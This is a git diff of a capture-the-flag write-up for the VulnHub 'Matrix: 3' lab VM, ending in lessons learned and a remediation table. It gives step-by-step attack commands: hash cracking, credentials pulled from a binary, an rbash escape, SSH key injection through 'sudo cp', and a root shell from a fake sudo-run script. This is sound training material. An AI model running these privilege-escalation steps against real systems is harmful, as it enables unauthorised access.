@@ -1,154 +1,196 @@
 # Matrix: 3 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.104 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.104 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | (in /root/flag.txt — shown in screenshot) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/matrix-3,326/) |
+| **Goal** | Read `/root/flag.txt` |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/matrix-3-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → dirb → secret.gz (cracked hash admin:passwd) → Basic Auth port 7331 → DOS binary (Ghidra) → SSH as guest → rbash escape → sudo cp SSH key injection → sudo oracle script → root
+Find hidden credentials via directory enumeration and image filename analysis, crack a hash from a gzip-disguised text file, use Ghidra to reverse a DOS executable for a second credential set, escape an rbash restriction over SSH, chain two `sudo cp` and `sudo ./oracle` privilege escalation steps through users `guest` and `trinity`, then create a fake `oracle` binary to get a root shell.
 
 ## Methodology
 
-1. Network and port discovery
-2. Web directory brute force and file traversal
-3. Hash cracking for Basic Auth credentials
-4. Binary reverse engineering (Ghidra) for SSH credentials
-5. rbash escape
-6. Lateral movement via sudo cp (SSH key injection)
-7. Root via writable sudo-run script
+1. Reconnaissance (netdiscover + nmap)
+2. Web enumeration (dirb, image filename hint, `secret.gz`)
+3. Hash cracking
+4. Binary analysis with Ghidra (DOS executable)
+5. SSH with rbash escape
+6. Privilege escalation via abusing sudo rights (cp + custom binary)
 
----
-
-## Step 1: Network Discovery
+## Step 1: Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+netdiscover -r 192.168.1.0/24
+```
+
+Target identified at **192.168.1.104**.
+
+## Step 2: Reconnaissance
+
+```bash
 nmap -p- -A 192.168.1.104
 ```
 
-Findings: port 80 (HTTP), port 6464 (SSH), port 7331 (HTTP — Basic Auth protected).
+![Nmap scan](images/01-nmap.png)
 
-![Nmap results](images/01-nmap.png)
+Key open ports:
 
----
+| Port  | Service | Notes |
+|-------|---------|-------|
+| 80    | HTTP    | Apache — no useful content on main page |
+| 6464  | SSH     | OpenSSH |
+| 7331  | HTTP    | Basic Authentication protected |
 
-## Step 2: Web Enumeration — Port 80
+## Step 3: Web Enumeration on Port 80
+
+Run dirb to discover hidden directories:
 
 ```bash
-dirb http://192.168.1.104
+dirb http://192.168.1.104/
 ```
 
-Discovers `/assets`. Browse to `/assets/img/` — finds image `Matrix_can-show-you-the-door.png`.
+The `/assets/img/` directory contains `Matrix_can-show-you-the-door.png`. The filename itself is the clue: navigate to `/Matrix`.
 
-The filename hints at the path `/Matrix`:
+The `/Matrix` path is a directory listing requiring an alphanumeric sub-path. Based on the film theme (Neo, the actor's name, and a numeric hint), try:
+
+```
+http://192.168.1.104/Matrix/n/e/o/6/4
+```
+
+This reveals `secret.gz`. Download it:
+
 ```bash
-curl http://192.168.1.104/Matrix/n/e/o/6/4/
-# Directory listing — download secret.gz
 wget http://192.168.1.104/Matrix/n/e/o/6/4/secret.gz
 file secret.gz
+# secret.gz: ASCII text (mislabelled extension)
 cat secret.gz
-# It's actually a text file containing a hash
 ```
 
-Crack the hash using hashkiller or john:
-```
-hash → password: passwd
-```
-
-![Directory traversal and credentials](images/02-dirb.png)
-
----
-
-## Step 3: Port 7331 — Authenticated Enumeration
+The file contains a username and a hash. Crack the hash with an online tool or with hashcat/john:
 
 ```bash
-dirb http://192.168.1.104:7331 / -u admin:passwd
-# Finds /data directory containing a file named 'data'
-wget --user=admin --password=passwd http://192.168.1.104:7331/data/data
-file data
-# DOS executable
+john --wordlist=/usr/share/wordlists/rockyou.txt secret.gz
+# Password: passwd
 ```
 
-Open `data` in Ghidra (File → Import File → analyze):
+![Enumeration and credential extraction](images/02-enum.png)
 
-Inside the strings or decompiled output, locate hardcoded credentials:
-```
-guest:7R1n17yN30
-```
+## Step 4: Enumerate Port 7331 with Basic Auth
 
-![Credentials in binary](images/03-creds.png)
-
----
-
-## Step 4: SSH Login + rbash Escape
+Log in to `http://192.168.1.104:7331` with `admin:passwd`. The page is empty, but directory enumeration with credentials reveals a `/data` directory:
 
 ```bash
-ssh guest@192.168.1.104 -p6464
-# Restricted shell (rbash)
+dirb http://192.168.1.104:7331/ -u admin:passwd
+```
 
-# Escape with:
-ssh guest@192.168.1.104 -p6464 -t "bash --noprofile"
+The `/data` directory contains a file. Download it and check its type:
+
+```bash
+wget http://192.168.1.104:7331/data/<filename>
+file <filename>
+# MS-DOS executable
+```
+
+## Step 5: Reverse the DOS Binary with Ghidra
+
+Import the binary into Ghidra, run auto-analysis, and inspect string references and the main function. Hardcoded credentials are visible:
+
+```
+Username: guest
+Password: 7R1n17yN30
+```
+
+![Exploitation — Ghidra credential extraction](images/03-exploit.png)
+
+## Step 6: SSH as guest (rbash escape)
+
+```bash
+ssh guest@192.168.1.104 -p 6464
+# The shell drops into rbash (restricted bash)
+```
+
+Bypass rbash by forcing bash to ignore the profile:
+
+```bash
+ssh guest@192.168.1.104 -p 6464 -t "bash --noprofile"
+```
+
+Check sudo rights:
+
+```bash
 sudo -l
-# User guest may run: /bin/cp as trinity
+# (trinity) NOPASSWD: /bin/cp
 ```
 
-![SSH and rbash escape](images/04-ssh.png)
+## Step 7: Escalate to trinity via sudo cp
 
----
-
-## Step 5: Lateral Move to trinity (SSH Key Injection via sudo cp)
+Generate an SSH key pair:
 
 ```bash
-# Generate SSH key pair
-ssh-keygen -t rsa -b 2048 -f /tmp/key -N ""
-chmod 777 /tmp/key.pub
-
-# Overwrite trinity's authorized_keys
-sudo -u trinity /bin/cp /tmp/key.pub /home/trinity/.ssh/authorized_keys
-
-# SSH in as trinity
-ssh trinity@127.0.0.1 -i /tmp/key -p 6464
-sudo -l
-# User trinity may run: /home/trinity/oracle as root
+ssh-keygen -f /tmp/id_rsa -N ""
+chmod 777 /tmp/id_rsa.pub
+cp /tmp/id_rsa.pub /home/guest/id_rsa.pub
 ```
 
----
+Use sudo cp to place the public key into trinity's authorized_keys:
 
-## Step 6: Root via Writable Oracle Script
+```bash
+sudo -u trinity /bin/cp /home/guest/id_rsa.pub /home/trinity/.ssh/authorized_keys
+```
 
-The oracle binary doesn't exist — create it:
+SSH in as trinity:
+
+```bash
+ssh trinity@127.0.0.1 -i /tmp/id_rsa -p 6464
+```
+
+Check trinity's sudo rights:
+
+```bash
+sudo -l
+# (root) NOPASSWD: /home/trinity/oracle
+```
+
+![Privilege escalation — sudo abuse](images/04-privesc.png)
+
+## Step 8: Root via Custom oracle Binary
+
+The `oracle` file does not exist. Create one that launches a shell:
 
 ```bash
 echo "/bin/sh" > /home/trinity/oracle
 chmod 777 /home/trinity/oracle
 sudo ./oracle
+```
+
+You now have a root shell:
+
+```bash
 id
-# uid=0(root)
-ls /root
+# uid=0(root) gid=0(root)
 cat /root/flag.txt
 ```
 
-![Root flag](images/05-root.png)
-
----
+![Root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Hardcoded credentials in binaries** — reverse engineering DOS/ELF files with Ghidra reveals plaintext creds; use environment variables or secrets management
-2. **sudo cp abuse** — write permissions via cp can overwrite `authorized_keys`; restrict sudo to specific paths and destination
-3. **sudo with user-controlled scripts** — running a user-writable file as root is trivially exploitable; sudo rules must point to immutable binaries
-4. **rbash** is not a security control — easily bypassed with `bash --noprofile` or `ssh -t`
+1. Obscure URL paths (e.g., `/Matrix/n/e/o/6/4`) are discoverable by mirroring the site or following filename hints.
+2. Binary files should be reverse-engineered: hardcoded credentials in a DOS executable are a critical finding.
+3. Sudo rules for `/bin/cp` are dangerous — an attacker can overwrite any file the target user owns, including SSH `authorized_keys`.
+4. Sudo rules referencing non-existent files allow attackers to create those files with arbitrary content.
+5. Restricted shells (rbash) can often be escaped with `--noprofile` or by invoking a different shell binary.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Credentials in DOS binary | Use secrets management; never hardcode credentials |
-| sudo cp to sensitive paths | Restrict copy destinations in sudoers; use `Cmnd_Alias` with path guards |
-| User-controlled sudo script | Ensure sudo-run scripts are root-owned and immutable |
-| rbash escape | Use real shell restriction (e.g., `ForceCommand` in sshd_config) |
+|---|---|
+| Hardcoded credentials in binary | Use environment variables or a secrets manager; never embed credentials in code |
+| Sudo cp (file write as another user) | Restrict sudo rules to specific, non-abusable binaries |
+| Sudo oracle (non-existent path) | Ensure sudo-allowed binaries exist and are not world-writable |
+| rbash bypass | Enforce login shell restrictions at the PAM or SSH `ForceCommand` level |
+| Basic Auth with weak password | Enforce strong passwords; prefer certificate-based or token-based authentication |
